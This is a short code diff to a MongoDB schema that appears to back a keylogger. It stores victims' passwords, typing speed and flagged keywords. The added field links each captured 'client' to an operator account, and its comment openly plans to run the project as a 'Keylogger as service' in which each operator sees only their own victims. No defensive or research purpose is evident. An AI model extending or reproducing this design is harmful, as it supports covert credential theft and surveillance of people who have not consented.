@@ -5,6 +5,7 @@ const ClientProfileSchema = new mongoose.Schema({
   display_name: String,      
   registered_on: { type: Date, default: Date.now },
   tags: [String],
+  Daddy: { type: mongoose.Schema.Types.ObjectId, ref: 'User'}, // This is for future if I want to deploy it as Keylogger as service kinda shit then each person should see his client's only!
   TypingSpeed: Number, //wpm
   offensive_keywords: [String],
   Passwords: [String],
